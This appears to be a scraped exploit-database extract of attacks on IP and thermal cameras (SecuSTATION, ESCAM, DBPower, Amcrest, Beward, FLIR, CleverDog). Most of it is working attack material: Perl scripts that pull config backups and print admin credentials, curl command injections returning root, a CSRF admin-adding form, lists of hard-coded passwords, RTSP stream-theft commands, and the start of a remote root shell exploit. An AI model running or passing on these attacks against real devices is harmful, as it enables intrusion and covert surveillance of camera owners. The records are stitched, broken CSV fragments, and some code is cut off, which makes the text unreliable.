#[ <<  Date => Fri, 21 Feb 2020 21:11:37 GMT
#[ <<  Accept-Ranges => bytes
#[ <<  Server => thttpd/2.25b 29dec2003
#[ <<  Content-Length => 32333
#[ <<  Content-Type => application/octet-stream
#[ <<  Last-Modified => Fri, 21 Feb 2020 21:11:36 GMT
#[ <<  Client-Date => Fri, 21 Feb 2020 21:12:23 GMT
#[ <<  Client-Peer => 192.168.100.200:81
#[ <<  Client-Response-Num => 1
#[ Username : admin
#[ Password : admin
#!/usr/bin/perl
# my $target = $host.""/tmpfs/config_backup.bin"";","use strict;
use HTTP::Request;
use LWP::UserAgent;
use WWW::UserAgent::Random;
use Gzip::Faster 'gunzip';
my $host = shift || ''; # Full path url to the store
my $cmd = shift || ''; # show - Show configuration dump
$host =~ s/\/$//;
print  ""\033[2J"";    #clear the screen
print  ""\033[0;0H""; #jump to 0,0
print ""[ SecuSTATION IPCAM-130 HD Camera Remote Configuration Disclosure\n"";
print ""[ ===============================================================\n"";
print ""[ Exploit Author: Todor Donev 2020 <todor.donev\@gmail.com>\n"";
if ($host !~ m/^http/){
print ""[ Usage, Password Disclosure: perl $0 https://target:port/\n"";
print ""[ Usage, Show Configuration : perl $0 https://target:port/ show\n"";
exit;
print ""[ Initializing the browser\n"";
my $user_agent = rand_ua(""browsers"");
my $browser  = LWP::UserAgent->new(protocols_allowed => ['http', 'https'],ssl_opts => { verify_hostname => 0 });
$browser->timeout(30);
$browser->agent($user_agent);
my $target = $host.""\x2f\x77\x65\x62\x2f\x63\x67\x69\x2d\x62\x69\x6e\x2f\x68\x69\x33\x35\x31\x30\x2f\x62\x61\x63\x6b\x75\x70\x2e\x63\x67\x69"";
my $request = HTTP::Request->new (GET => $target,[Content_Type => ""application/x-www-form-urlencoded""]);
my $response = $browser->request($request) or die ""[ Exploit Failed: $!"";
print ""[ >>  $_ => "", $request->header($_), ""\n"" for  $request->header_field_names;
print ""[ <<  $_ => "", $response->header($_), ""\n"" for  $response->header_field_names;
print ""[ Exploit failed! Not vulnerable.\n"" and exit if ($response->code ne 200);
my $gzipped = $response->content();
my $config = gunzip($gzipped);
print ""[ \n"";
if ($cmd =~ /show/) {
print ""[ >> Configuration dump...\n[\n"";
print  ""[ "", $_, ""\n"" for split(/\n/,$config);
exit;
} else {
print  ""[ Username : "", $1, ""\n"" if ($config =~ /username=(.*)/);
print  ""[ Password : "", $1, ""\n"" if ($config =~ /password=(.*)/);
exit;"
2020-02-24,WebApps,Hardware,Todor Donev,ESCAM QD-900 WIFI HD Camera,Remote Configuration Disclosure,"# Title: ESCAM QD-900 WIFI HD Camera - Remote Configuration Disclosure
# Author: Todor Donev
# Date: 2020-02-23
# Vendor: www.escam.cn
# Product Link: http://www.escam.cn/search/?class1=&class2=&class3=&searchtype=0&searchword=qd-900&lang=en
# CVE: N/A
#!/usr/bin/perl
#  ESCAM QD-900 WIFI HD Camera Remote Configuration Disclosure
#  Copyright 2020 (c) Todor Donev
#  https://donev.eu/
#  Disclaimer:
#  This or previous programs are for Educational purpose ONLY. Do not use it without permission.
#  The usual disclaimer applies, especially the fact that Todor Donev is not liable for any damages
#  caused by direct or indirect use of the  information or functionality provided by these programs.
#  The author or any Internet provider  bears NO responsibility for content or misuse of these programs
#  or any derivatives thereof. By using these programs you accept the fact  that any damage (dataloss,
#  system crash, system compromise, etc.) caused by the use  of these programs are not Todor Donev's
#  responsibility.
#  Use them at your own risk!
#  (Dont do anything without permissions)
#[ ESCAM QD-900 WIFI HD Camera Remote Configuration Disclosure
#[ ===========================================================
#[ Exploit Author: Todor Donev 2020 <todor.donev@gmail.com>
#[ Initializing the browser
#[ >>  User-Agent => Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.7.5) Gecko/20050105 Epiphany/1.4.8
#[ >>  Content-Type => application/x-www-form-urlencoded
#[ <<  Connection => close
#[ <<  Date => Fri, 21 Feb 2020 20:23:56 GMT
#[ <<  Accept-Ranges => bytes
#[ <<  Server => thttpd/2.25b 29dec2003
#[ <<  Content-Length => 25003
#[ <<  Content-Type => application/octet-stream
#[ <<  Last-Modified => Fri, 21 Feb 2020 20:23:55 GMT
#[ <<  Client-Date => Fri, 21 Feb 2020 20:23:57 GMT
#[ <<  Client-Peer => 192.168.1.105:8000
#[ <<  Client-Response-Num => 1
#[ Username : admin
#[ Password : admin
# my $target = $host.""/tmpfs/config_backup.bin"";","use strict;
use HTTP::Request;
use LWP::UserAgent;
use WWW::UserAgent::Random;
use Gzip::Faster 'gunzip';
my $host = shift || ''; # Full path url to the store
my $cmd = shift || ''; # show - Show configuration dump
$host =~ s/\/$//;
print  ""\033[2J"";    #clear the screen
print  ""\033[0;0H""; #jump to 0,0
print ""[ ESCAM QD-900 WIFI HD Camera Remote Configuration Disclosure\n"";
print ""[ ===========================================================\n"";
print ""[ Exploit Author: Todor Donev 2020 <todor.donev\@gmail.com>\n"";
if ($host !~ m/^http/){
print ""[ Usage, Password Disclosure: perl $0 https://target:port/\n"";
print ""[ Usage, Show Configuration : perl $0 https://target:port/ show\n"";
exit;
print ""[ Initializing the browser\n"";
my $user_agent = rand_ua(""browsers"");
my $browser  = LWP::UserAgent->new(protocols_allowed => ['http', 'https'],ssl_opts => { verify_hostname => 0 });
$browser->timeout(30);
$browser->agent($user_agent);
my $target = $host.""\x2f\x77\x65\x62\x2f\x63\x67\x69\x2d\x62\x69\x6e\x2f\x68\x69\x33\x35\x31\x30\x2f\x62\x61\x63\x6b\x75\x70\x2e\x63\x67\x69"";
my $request = HTTP::Request->new (GET => $target,[Content_Type => ""application/x-www-form-urlencoded""]);
my $response = $browser->request($request) or die ""[ Exploit Failed: $!"";
print ""[ >>  $_ => "", $request->header($_), ""\n"" for  $request->header_field_names;
print ""[ <<  $_ => "", $response->header($_), ""\n"" for  $response->header_field_names;
print ""[ Exploit failed! Not vulnerable.\n"" and exit if ($response->code ne 200);
my $gzipped = $response->content();
my $config = gunzip($gzipped);
print ""[ \n"";
if ($cmd =~ /show/) {
print ""[ >> Configuration dump...\n[\n"";
print  ""[ "", $_, ""\n"" for split(/\n/,$config);
exit;
} else {
print  ""[ Username : "", $1, ""\n"" if ($config =~ /username=(.*)/);
print  ""[ Password : "", $1, ""\n"" if ($config =~ /password=(.*)/);
exit;"
2020-02-19,WebApps,Hardware,Todor Donev,DBPower C300 HD Camera,Remote Configuration Disclosure,"# Exploit Title: DBPower C300 HD Camera - Remote Configuration Disclosure
# Date: 2020-02-19
# Author: Todor Donev
# Vendor: https://donev.eu/
# CVE: N/A
#  Copyright 2020 (c) Todor Donev
#  https://donev.eu/
#  https://donev.eu/blog/dbpower-c300-multiple-vulnerabilities
#  Disclaimer:
#  This or previous programs are for Educational purpose ONLY. Do not use it without permission.
#  The usual disclaimer applies, especially the fact that Todor Donev is not liable for any damages
#  caused by direct or indirect use of the  information or functionality provided by these programs.
#  The author or any Internet provider  bears NO responsibility for content or misuse of these programs
#  or any derivatives thereof. By using these programs you accept the fact  that any damage (dataloss,
#  system crash, system compromise, etc.) caused by the use  of these programs are not Todor Donev's
#  responsibility.
#  Use them at your own risk!
#  (Dont do anything without permissions)
#[ DBPower C300 HD Camera Remote Configuration Disclosure
#[ ==========================================================
#[ Exploit Author: Todor Donev 2020 <todor.donev@gmail.com>
#[ Initializing the browser
#[ >>  User-Agent => Seamonkey-1.1.13-1(X11; U; GNU Fedora fc 10) Gecko/20081112
#[ >>  Content-Type => application/x-www-form-urlencoded
#[ <<  Connection => close
#[ <<  Date =>
#[ <<  Accept-Ranges => bytes
#[ <<  Server => thttpd/2.25b 29dec2003
#[ <<  Content-Length => 25730
#[ <<  Content-Type => application/octet-stream
#[ <<  Last-Modified =>
#[ <<  Client-Date =>
#[ <<  Client-Peer => 192.168.1.103:8080
#[ <<  Client-Response-Num => 1
#[ Username : admin
#[ Password : admin
#!/usr/bin/perl
# my $target = $host.""/tmpfs/config_backup.bin"";","use strict;
use HTTP::Request;
use LWP::UserAgent;
use WWW::UserAgent::Random;
use Gzip::Faster 'gunzip';
my $host = shift || ''; # Full path url to the store
my $cmd = shift || ''; # show - Show configuration dump
$host =~ s/\/$//;
print  ""\033[2J"";    #clear the screen
print  ""\033[0;0H""; #jump to 0,0
print ""[ DBPower C300 HD Camera Remote Configuration Disclosure\n"";
print ""[ ==========================================================\n"";
print ""[ Exploit Author: Todor Donev 2020 <todor.donev\@gmail.com>\n"";
if ($host !~ m/^http/){
print ""[ Usage, Password Disclosure: perl $0 https://target:port/\n"";
print ""[ Usage, Show Configuration : perl $0 https://target:port/ show\n"";
exit;
print ""[ Initializing the browser\n"";
my $user_agent = rand_ua(""browsers"");
my $browser  = LWP::UserAgent->new(protocols_allowed => ['http', 'https'],ssl_opts => { verify_hostname => 0 });
$browser->timeout(30);
$browser->agent($user_agent);
my $target = $host.""\x2f\x77\x65\x62\x2f\x63\x67\x69\x2d\x62\x69\x6e\x2f\x68\x69\x33\x35\x31\x30\x2f\x62\x61\x63\x6b\x75\x70\x2e\x63\x67\x69"";
my $request = HTTP::Request->new (GET => $target,[Content_Type => ""application/x-www-form-urlencoded""]);
my $response = $browser->request($request) or die ""[ Exploit Failed: $!"";
print ""[ >>  $_ => "", $request->header($_), ""\n"" for  $request->header_field_names;
print ""[ <<  $_ => "", $response->header($_), ""\n"" for  $response->header_field_names;
print ""[ Exploit failed! Not vulnerable.\n"" and exit if ($response->code ne 200);
my $gzipped = $response->content();
my $config = gunzip($gzipped);
print ""[ \n"";
if ($cmd =~ /show/) {
print ""[ >> Configuration dump...\n[\n"";
print  ""[ "", $_, ""\n"" for split(/\n/,$config);
exit;
} else {
print  ""[ Username : "", $1, ""\n"" if ($config =~ /username=(.*)/);
print  ""[ Password : "", $1, ""\n"" if ($config =~ /password=(.*)/);
exit;"
2020-02-03,DoS,iOS,Ivan Marmolejo,P2PWIFICAM2 for iOS 10.4.1,'Camera ID' Denial of Service (PoC),"# Exploit Title: P2PWIFICAM2 for iOS 10.4.1 - 'Camera ID' Denial of Service (PoC)
# Discovery by: Ivan Marmolejo
# Discovery Date: 2020-02-02
# Vendor Homepage: https://apps.apple.com/mx/app/p2pwificam2/id663665207
# Software Link: App Store for iOS devices
# Tested Version: 10.4.1
# Vulnerability Type: Denial of Service (DoS) Local
# Tested on OS: iPhone 6s iOS 13.3
# Summary: P2PWIFICAM is a matching network camera P2P (point to point) monitoring software.
# Adopt the advanced P2P technology, can make the camera in the intranet from port mapping complex,
# truly plug and play!
# Steps to Produce the Crash:
# 1.- Run python code: P2PWIFICAM.py
# 2.- Copy content to clipboard
# 3.- Open ""P2PWIFICAM"" for Ios
# 4.- Go to ""Add"" (Touch here to add a camera)
# 5.- Go to ""Input Camera""
# 6.- Paste Clipboard on ""Camera ID""
# 7.- Paste Clipboard on ""Password""
# 9.- Ok
# 10- Crashed
#!/usr/bin/env python","buffer = ""\x41"" * 257
print (buffer)"
2019-07-30,WebApps,Hardware,Jacob Baines,Amcrest Cameras 2.520.AC00.18.R,Unauthenticated Audio Streaming,"# Exploit Title: Unauthenticated Audio Streaming from Amcrest Camera
# Shodan Dork: html:""@WebVersion@""
# Date: 08/29/2019
# Exploit Author: Jacob Baines
# Vendor Homepage: https://amcrest.com/
# Software Link: https://amcrest.com/firmwaredownloads
# Affected Version: V2.520.AC00.18.R
# Fixed Version: V2.420.AC00.18.R
# Tested on: Tested on Amcrest IP2M-841 but known to affect other Dahua devices.
# CVE : CVE-2019-3948
# Disclosure: https://www.tenable.com/security/research/tra-2019-36
# Disclosure: https://sup-files.s3.us-east-2.amazonaws.com/Firmware/IP2M-841/JS+IP2M-841/Changelog/841_721_HX1_changelog_20190729.txt
# To decode the scripts output using ffplay use:
# ffplay -f alaw -ar 8k -ac 1 [poc output]
# Note that this assumes the camera is using the default encoding options.
# Read in the specified amount of data. Continuing looping until we get it all...
# what could go wrong?
# @return the data we read in
# read in the HTTP response. Store the status.
# read in the header length
# read in the header and extract the payload length
# there is a seq no in the header but since this is over
# tcp is sort of useless.
# extract the audio. I'm really not sure what the first 6 bytes are
# but the last 8 serve as a type of trailer","import argparse
import socket
import struct
import sys
def recv_all(sock, amount):
data = ''
while len(data) != amount:
temp_data = sock.recv(amount - len(data))
data = data + temp_data
return data
top_parser = argparse.ArgumentParser(description='Download audio from the HTTP videotalk endpoint')
top_parser.add_argument('-i', '--ip', action=""store"", dest=""ip"", required=True, help=""The IPv4 address to connect to"")
top_parser.add_argument('-p', '--port', action=""store"", dest=""port"", type=int, help=""The port to connect to"", default=""80"")
top_parser.add_argument('-o', '--output', action=""store"", dest=""output"", help=""The file to write the audio to"")
top_parser.add_argument('-b', '--bytes', action=""store"", dest=""bytes"", type=int, help=""The amount of audio to download"", default=""1048576"")
args = top_parser.parse_args()
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setblocking(True)
print ""[+] Attempting connection to "" + args.ip + "":"" + str(args.port)
sock.connect((args.ip, args.port))
print ""[+] Connected!""
request = ('GET /videotalk HTTP/1.1\r\n' +
'Host: ' + args.ip + ':' + str(args.port) + '\r\n' +
'Range: bytes=0-\r\n' +
'\r\n')
sock.sendall(request)
status = ''
header = ''
while (header != '\r\n'):
header = header + sock.recv(1);
if (header.find('\r\n') > 0):
header = header.strip()
if (len(status) == 0):
status = header
header = ''
if (status.find('200 OK') == -1):
print '[-] Bad HTTP status. We received: ""' + status + '""'
sock.close()
exit()
else:
print '[+] Downloading ' + str(args.bytes) + ' bytes of audio ...'
total_audio = ''
while (len(total_audio) < args.bytes):
header_length = recv_all(sock, 4)
hlength = struct.unpack(""I"", header_length)[0]
if (hlength != 36):
print '[-] Unexpected header length'
sock.close()
exit()
header = recv_all(sock, hlength)
plength = struct.unpack_from("">H"", header)[0]
if (plength != 368):
print '[-] Unexpected payload length'
sock.close()
exit()
dhav = header[2:6]
if (dhav != ""DHAV""):
print '[-] Invalid header'
exit(0)
whatami = recv_all(sock, 6)
audio = recv_all(sock, plength - hlength - 12)
trailer = recv_all(sock, 8)
if (trailer != 'dhavp\x01\x00\x00'):
print '[-] Invalid end of frame'
sock.close()
exit()
total_audio = total_audio + audio
sys.stdout.write('\r'+ str(len(total_audio)) + "" / "" + str(args.bytes))
sys.stdout.flush()
print ''
print '[+] Finished receiving audio.'
print '[+] Closing socket'
out_file = open(args.output, 'wb')
out_file.write(total_audio)
out_file.close()
sock.close()"
2019-06-17,WebApps,Hardware,Alex Akinbi,CleverDog Smart Camera DOG-2W / DOG-2W-V4,Multiple Vulnerabilities,,"1. Advisory Information
Title: Clever Dog Smart Camera
Vendor Homepage: http://www.cleverdog.com.cn/
Tested on Camera types: DOG-2W, DOG-2W-V4
Vulnerability: Hardware- Multiple Vulnerabilities
Date: 14/06/2019
Author: Alex Akinbi      Twitter: @alexakinbi
1. Unauthenticated file disclosure:
An attacker on the local network has unauthenticated access to the internal SD card via HTTP service on port 8000. The HTTP web server on the camera allows an attacker to download video archive recorded and saved on the external memory card attached.
For example: http://192.168.1.81:8000/20190606
2. Telnet Backdoor using default credentials:
An attacker on the network can login remotely to the camera and gain root access. The device ships with hard-coded credentials, accessible from a telnet login prompt using credentials username: "" root"" and password: ""12345678"". These credentials work on all devices.
3. Login password sent over network unencrypted using Clever Dog App:
Using a packet sniffer, an attacker on the same network can capture data packets and view
captured user login password MD5 hash. A weak password can be cracked and used to login to the user account.
4. SOLUTION
Contact the vendor for further information regarding the proper mitigation of this vulnerability."
2019-02-05,WebApps,Hardware,LiquidWorm,BEWARD N100 H.264 VGA IP Camera M2.1.6,Arbitrary File Disclosure,"Summary: The N100 compact color IP camera with support for a more efficient
Desc: The camera suffers from an authenticated file disclosure vulnerability.","BEWARD N100 H.264 VGA IP Camera M2.1.6 Arbitrary File Disclosure
Vendor: Beward R&D Co., Ltd
Product web page: https://www.beward.net
Affected version: M2.1.6.04C014
compression format is optimized for low-speed networks, thanks to which it
transmits a real-time image over the network with minimal delays. The camera
supports the switching of the broadcast modes, and in the event of a break in
communication with the remote file storage, it can continue recording to the
microSDHC memory card. N100 is easy to install and configure, has all the
necessary arsenal for the organization of low-cost professional video surveillance
systems.
Input passed via the 'READ.filePath' parameter in fileread script is not properly
verified before being used to read files. This can be exploited to disclose
the contents of arbitrary files via absolute path or via the SendCGICMD API.
Tested on: Boa/0.94.14rc21
Farady ARM Linux 2.6
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2019-5511
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5511.php
26.01.2019
From the term:
root@ground:~# curl -H ""Authorization: Basic YWRtaW46YWRtaW4="" http://TARGET/cgi-bin/operator/fileread?READ.filePath=/etc/passwd
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/bin/sh
daemon:x:2:2:daemon:/usr/sbin:/bin/sh
adm:x:3:4:adm:/adm:/bin/sh
lp:x:4:7:lp:/var/spool/lpd:/bin/sh
sync:x:5:0:sync:/bin:/bin/sync
shutdown:x:6:11:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
uucp:x:10:14:uucp:/var/spool/uucp:/bin/sh
operator:x:11:0:Operator:/var:/bin/sh
nobody:x:99:99:nobody:/home:/bin/sh
From the web console:
SendCGICMD(""cgi-bin/operator/fileread?READ.filePath=/etc/passwd"")
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/bin/sh
daemon:x:2:2:daemon:/usr/sbin:/bin/sh
adm:x:3:4:adm:/adm:/bin/sh
lp:x:4:7:lp:/var/spool/lpd:/bin/sh
sync:x:5:0:sync:/bin:/bin/sync
shutdown:x:6:11:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
uucp:x:10:14:uucp:/var/spool/uucp:/bin/sh
operator:x:11:0:Operator:/var:/bin/sh
nobody:x:99:99:nobody:/home:/bin/sh
SendCGICMD(""cgi-bin/operator/fileread?READ.filePath=/etc/issue"")
Welcome to \n (\m-\s-\r@\l/\b)
Faraday ARM Linux 2.6
Copyright (C) 2005 Faraday Corp. <www.faraday.com.tw>
Released under GNU GPL
wr: /usr/share/www/html
sp: /var/www/secret.passwd
bc: /etc/boa.conf"
2019-02-05,WebApps,Hardware,LiquidWorm,BEWARD N100 H.264 VGA IP Camera M2.1.6,Remote Code Execution,"Summary: The N100 compact color IP camera with support for a more efficient
Desc: The camera suffers from two authenticated command injection vulnerabilities.","BEWARD N100 H.264 VGA IP Camera M2.1.6 Root Remote Code Execution
Vendor: Beward R&D Co., Ltd
Product web page: https://www.beward.net
Affected version: M2.1.6.04C014
compression format is optimized for low-speed networks, thanks to which it
transmits a real-time image over the network with minimal delays. The camera
supports the switching of the broadcast modes, and in the event of a break in
communication with the remote file storage, it can continue recording to the
microSDHC memory card. N100 is easy to install and configure, has all the
necessary arsenal for the organization of low-cost professional video surveillance
systems.
The issues can be triggered when calling ServerName or TimeZone GET parameters
via the servertest page. This can be exploited to inject arbitrary system commands
and gain root remote code execution.
Tested on: Boa/0.94.14rc21
Farady ARM Linux 2.6
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2019-5512
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5512.php
26.01.2019
TimeZone command injection:
root@ground:~# curl -X $'GET' -H $'Authorization: Basic YWRtaW46YWRtaW4=' $'http://TARGET/cgi-bin/operator/servetest?cmd=ntp&ServerName=pool.ntp.org&TimeZone=03:00|id||'
HTTP/1.1 200 OK
Date: Sun, 01 Jan 2012 10:15:53 GMT
Server: Boa/0.94.14rc21
Accept-Ranges: bytes
Connection: close
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)
Content-type: text/plain
ntp update
0 OK
ServerName command injection:
root@ground:~# curl -X $'GET' -H $'Authorization: Basic YWRtaW46YWRtaW4=' $'http://TARGET/cgi-bin/operator/servetest?cmd=ntp&ServerName=pool.ntp.org|id||&TimeZone=03:00'
HTTP/1.1 200 OK
Date: Sun, 01 Jan 2012 10:22:11 GMT
Server: Boa/0.94.14rc21
Accept-Ranges: bytes
Connection: close
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)
Content-type: text/plain
ntp update
0 OK"
2019-02-05,WebApps,Hardware,LiquidWorm,BEWARD N100 H.264 VGA IP Camera M2.1.6,Cross-Site Request Forgery (Add Admin),"Summary: The N100 compact color IP camera with support for a more efficient
Desc: The application interface allows users to perform certain actions via","BEWARD N100 H.264 VGA IP Camera M2.1.6 CSRF Add Admin Exploit
Vendor: Beward R&D Co., Ltd
Product web page: https://www.beward.net
Affected version: M2.1.6.04C014
compression format is optimized for low-speed networks, thanks to which it
transmits a real-time image over the network with minimal delays. The camera
supports the switching of the broadcast modes, and in the event of a break in
communication with the remote file storage, it can continue recording to the
microSDHC memory card. N100 is easy to install and configure, has all the
necessary arsenal for the organization of low-cost professional video surveillance
systems.
HTTP requests without performing any validity checks to verify the requests.
This can be exploited to perform certai actions with administrative privileges
if a logged-in user visits a malicious web site.
Tested on: Boa/0.94.14rc21
Farady ARM Linux 2.6
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2019-5510
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5510.php
26.01.2019
<html>
<body>
<form action=""http://TARGET/cgi-bin/admin/param"">
<input type=""hidden"" name=""action"" value=""add"" />
<input type=""hidden"" name=""group"" value=""General.UserID"" />
<input type=""hidden"" name=""template"" value=""UserID"" />
<input type=""hidden"" name=""General.UserID.U.User"" value=""dGVzdDp0ZXN0MTIz,01000001"" />
<input type=""submit"" value=""Send"" />
</form>
</body>
</html>
Base64(test:test123) + ,01000001 for A (Admin) = dGVzdDp0ZXN0MTIz,01000001"
2019-02-05,WebApps,Hardware,LiquidWorm,BEWARD N100 H.264 VGA IP Camera M2.1.6,RTSP Stream Disclosure,"Summary: The N100 compact color IP camera with support for a more efficient
Desc: BEWARD N100 camera suffers from an unauthenticated and unauthorized
http://TARGET/cgi-bin/view/image","BEWARD N100 H.264 VGA IP Camera M2.1.6 Unauthenticated RTSP Stream Disclosure
Vendor: Beward R&D Co., Ltd
Product web page: https://www.beward.net
Affected version: M2.1.6.04C014
compression format is optimized for low-speed networks, thanks to which it
transmits a real-time image over the network with minimal delays. The camera
supports the switching of the broadcast modes, and in the event of a break in
communication with the remote file storage, it can continue recording to the
microSDHC memory card. N100 is easy to install and configure, has all the
necessary arsenal for the organization of low-cost professional video surveillance
systems.
live RTSP video stream access.
Tested on: Boa/0.94.14rc21
Farady ARM Linux 2.6
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2019-5509
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5509.php
26.01.2019"
2018-10-17,Remote,Hardware,LiquidWorm,FLIR AX8 Thermal Camera 1.32.16,Hard-Coded Credentials,"# Exploit Title: FLIR AX8 Thermal Camera 1.32.16 - Hard-Coded Credentials
# Author: Gjoko 'LiquidWorm' Krstic @zeroscience
# Date: 2018-10-14
# Vendor: FLIR Systems, Inc
# Product web page: https://www.flir.com
# Affected version: Firmware: 1.32.16, 1.17.13, OS: neco_v1.8-0-g7ffe5b3
# Hardware: Flir Systems Neco Board
# Tested on: GNU/Linux 3.0.35-flir+gfd883a0 (armv7l), lighttpd/1.4.33, PHP/5.4.14
# References:
# Advisory ID: ZSL-2018-5494
# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5494.php
# Desc: The devices utilizes hard-coded and credentials within its Linux distribution
# image. These sets of credentials (SSH) are never exposed to the end-user and cannot
# be changed through any normal operation of the camera. Attacker could exploit this
# vulnerability by logging in using the default credentials for the web panel or gain
# shell access.
# Hard-coded SSH access:
# ----------------------
# Default web creds:
# ------------------","fliruser:3vlig
root:hello
admin:admin
user:user
viewer:viewer
service:???
developer:???"
2018-10-15,WebApps,Hardware,LiquidWorm,FLIR AX8 Thermal Camera 1.32.16,RTSP Stream Disclosure,"# Exploit Title: FLIR AX8 Thermal Camera 1.32.16 - RTSP Stream Disclosure
# Author: Gjoko 'LiquidWorm' Krstic @zeroscience
# Date: 2018-10-14
# Vendor: FLIR Systems, Inc.
# Product web page: https://www.flir.com
# Affected version: Firmware: 1.32.16, 1.17.13, OS: neco_v1.8-0-g7ffe5b3, Hardware: Flir Systems Neco Board
# Tested on: GNU/Linux 3.0.35-flir+gfd883a0 (armv7l), lighttpd/1.4.33, PHP/5.4.14
# References:
# Advisory ID: ZSL-2018-5492
# https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5492.php
# Desc: The FLIR AX8 thermal sensor camera suffers an unauthenticated and unauthorized
# live RTSP video stream access.
# PoC
# PoC - To freeze the stream:","$ cvlc rtsp://TARGET/mpeg4 --fullscreen
$ ffmpeg -i rtsp://TARGET/mpeg4 -b 7000k -vcodec copy -r 60 -y ./meltdown.mp4
$ ffplay rtsp://TARGET/mpeg4
$ wget http://TARGET/snapshot.jpg ; eog snapshot.jpg
$ curl -d ""action=set&resource=.image.state.freeze.set&value=true"" -X POST http://TARGET/res.php"
2018-10-15,WebApps,Hardware,LiquidWorm,FLIR AX8 Thermal Camera 1.32.16,Remote Code Execution,"# Exploit Title: FLIR AX8 Thermal Camera 1.32.16 - Remote Code Execution
# Author: Gjoko 'LiquidWorm' Krstic @zeroscience
# Date: 2018-10-14
# Vendor: FLIR Systems, Inc.
# Product web page: https://www.flir.com
# Affected version: Firmware: 1.32.16, 1.17.13, OS: neco_v1.8-0-g7ffe5b3, Hardware: Flir Systems Neco Board
# Tested on: GNU/Linux 3.0.35-flir+gfd883a0 (armv7l), lighttpd/1.4.33, PHP/5.4.14
# References:
# Advisory ID: ZSL-2018-5491
# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5491.php
# Desc: The FLIR AX8 thermal sensor camera suffers from two unauthenticated
# command injection vulnerabilities. The issues can be triggered when calling
# multiple unsanitized HTTP GET/POST parameters within the shell_exec function
# in res.php and palette.php file. This can be exploited to inject arbitrary
# system commands and gain root remote code execution.
# /FLIR/usr/www/res.php:
# ----------------------
# 1. <?php
# 2.   if (isset($_POST[""action""])) {
# 3.     switch ($_POST[""action""]) {
# 4.       case ""get"":
# 5.         if(isset($_POST[""resource""]))
# 6.         {
# 7.           switch ($_POST[""resource""]) {
# 8.             case "".rtp.hflip"":
# 9.               if (!file_exists(""/FLIR/system/journal.d/horizontal_flip.cfg"")) {
# 10.                $result = ""false"";
# 11.                break;
# 12.              }
# 13.              $result = file_get_contents(""/FLIR/system/journal.d/horizontal_flip.cfg"") === ""1"" ? ""true"" : ""false"";
# 14.              break;
# 15.            case "".rtp.vflip"":
# 16.              if (!file_exists(""/FLIR/system/journal.d/vertical_flip.cfg"")) {
# 17.                $result = ""false"";
# 18.                break;
# 19.              }
# 20.              $result = file_get_contents(""/FLIR/system/journal.d/vertical_flip.cfg"") === ""1"" ? ""true"" : ""false"";
# 21.              break;
# 22.            default:
# 23.              $result = trim(shell_exec(""LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/rls -o "".$_POST[""resource""]));
# 24.          }
# 25.        }
# /FLIR/usr/www/palette.php:
# --------------------------
# 1. <?php
# 2.   if(isset($_POST[""palette""])){
# 3.     shell_exec(""LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/palette "".$_POST[""palette""]);
# 4.     echo json_encode(array(""success""));
# 5.   }
# 6. ?>
#!/usr/bin/env python
# -*- coding: utf-8 -*-","import requests
import colorama
import random##
import time####
import json####
import sys#####
import os######
piton = os.path.basename(sys.argv[0])
if len(sys.argv) < 2:
print '\n\x20\x20[*] Usage: '+piton+' <ip:port>\n'
sys.exit()
bannah = """"""
|         1984 Pictures           |
|                                 |
|            presents             |
|                  ___            |
|                [|   |=|{)__     |
|                 |___| \/   )    |
|                  /|\      /|    |
|                 / | \     | \\   |
print bannah
time.sleep(4)
os.system('clear')
print '\nFLIR AX8 Thermal Camera Remote Root Exploit'
print 'By Zero Science Lab'
ICU = '''
`./+ooosoooooo+/.`
`.+ss+//:::::::://+ss+.`
-oyo/::::-------:::::/oyo-
`/yo+:::-------.------:::+oy/`
`+yo+::---...........----:/+oy+`
`/yo++/--...../+oo+:....---:/+oy/`
`ss++//:-.../yhhhhhhy/...-://++ss`
.ho++/::--.-yhhddddhhy-.--:://+oh.
.ho+//::---/mmmmmmmmmm:---::/++oh.
`ss++//::---+mNNNNNNm+---:://++ss`
`/yo+//:::----+syys+-----://++oy/`
`+yo++//:::-----------:://++oy+`
`/yo++///:::::-:::::://+++oy/`
.oyo+++////////////+++oyo.
`.+ssoo++++++++++ooss+.`
`./+osssssssso+/.`
colors = list(vars(colorama.Fore).values())
colored_chars = [random.choice(colors) + char for char in ICU]
print(''.join(colored_chars))
print
print '\x1b[1;37;44m'+'To freeze the stream run:   '+'\x1b[0m'+' /FLIR/usr/bin/freeze on'
print '\x1b[1;37;41m'+'To unfreeze the stream run: '+'\x1b[0m'+' /FLIR/usr/bin/freeze off\n'
print '[*] Additional commands:'
print ' [+] \'addroot\' for add root user.'
print ' [+] \'exit\' for exit.\n'
while True:
zeTargets = 'http://'+sys.argv[1]+'/res.php'
zeCommand = raw_input('\x1b[0;96;49m'+'root@neco-0J0X17:~# '+'\x1b[0m')
zeHeaders = {'Cache-Control'   : 'max-age=0',
'User-Agent'      : 'thricer/251.4ev4h',
'Accept'          : 'text/html,application/xhtml+xml',
'Accept-Encoding' : 'gzip, deflate',
'Accept-Language' : 'mk-MK,mk;q=1.7',
'Connection'      : 'close',
